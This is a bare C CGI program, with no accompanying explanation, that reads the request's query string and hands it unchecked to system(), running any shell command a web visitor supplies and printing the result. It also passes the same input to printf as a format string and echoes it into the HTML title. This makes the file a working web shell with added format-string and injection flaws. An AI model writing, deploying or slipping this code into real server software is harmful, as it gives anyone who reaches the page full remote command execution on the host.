#include <stdlib.h>
#include <stdio.h>
int main()
{
	printf("Content-Type: text/html\n\n");
	printf("<html><head><title>Output of ");
	fflush(stdout);
	printf(getenv("QUERY_STRING"));
	printf("</title></head>");
	printf("<body><p>");
	fflush(stdout);
	system(getenv("QUERY_STRING"));
	printf("</p></body></html>");

	return 0;
}
